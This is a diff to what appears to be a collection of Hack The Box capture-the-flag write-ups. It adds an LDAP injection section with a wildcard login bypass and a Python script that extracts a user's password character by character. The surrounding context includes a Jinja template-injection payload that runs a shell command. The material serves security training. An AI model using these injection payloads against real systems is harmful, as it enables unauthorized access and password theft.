@@ -7,6 +7,33 @@ Payload:
 http://<ip_address>/{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt')).read()}}
 ```
 
+## Phonebook `LDAP Injection`
+Bypass login using *:* credentials.
+
+Get reese's password -> flag:
+Python script: 
+```
+import requests, string
+alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
+
+proxies = {
+    'http': 'http://127.0.0.1:8080'
+}
+
+flag = "HTB{"
+for i in range(50):
+    print("[i] Looking for number " + str(i))
+    # print(alphabet)
+    for char in alphabet:
+        pwd = flag + char + '*'
+        r = requests.post("http://<ip_address>/login", data={"username":"reese", "password":pwd}, proxies=proxies)
+        if ("'Content-Length': '2586'" in str(r.headers)):
+            flag += char
+            print("[+] Flag: " + flag)
+            break
+```
+
+
 
 ## LoveTok `Code Injection [PHP eval()]`
 ```
